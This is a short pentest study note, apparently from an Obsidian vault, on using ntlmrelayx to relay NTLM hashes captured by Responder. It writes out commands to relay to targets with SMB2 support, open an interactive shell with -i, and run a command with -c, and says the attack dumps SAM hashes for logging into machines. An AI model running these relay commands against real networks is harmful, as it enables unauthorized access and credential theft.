#ntlmrelayx 

![[Pasted image 20240909113803.png]]

```
sudo ntlmrelayx.py -tf 'target file' -smb2support
```


Use to relay repsonders hashes instead of trying to offline crack them
- need an event to occur like responder does
- dumps hashes of the SAM
- used to log into the machine with hashes


![[Pasted image 20240909114019.png]]


Can create interactive #shell with the -i

```
sudo ntlmrelayx.py -tf 'target file' -smb2support -i
```

Can run commands to for quick testing

```
sudo ntlmrelayx.py -tf 'target file' -smb2support -c "whoami"
```